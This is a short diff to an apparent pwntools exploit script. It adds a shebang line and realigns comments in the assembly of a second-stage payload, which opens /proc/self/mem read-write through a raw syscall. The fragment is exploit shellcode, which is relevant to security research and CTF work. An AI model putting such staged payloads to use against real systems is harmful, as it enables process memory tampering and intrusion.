@@ -1,3 +1,5 @@
+#!/usr/bin/env python3
+
 import argparse
 from pwn import *
 context.arch = "amd64"
@@ -118,10 +120,10 @@ stage2 = asm(fr"""
 	fxsave moar_regs[rip]
 
 	// Open /proc/self/mem
-	mov rax, 2          # SYS_OPEN
+	mov rax, 2                   # SYS_OPEN
 	lea rdi, proc_self_mem[rip]  # path
-	mov rsi, 2        # flags (O_RDWR)
-	xor rdx, rdx          # mode
+	mov rsi, 2                   # flags (O_RDWR)
+	xor rdx, rdx                 # mode
 	syscall
 	mov r15, rax  # save the fd for later
 
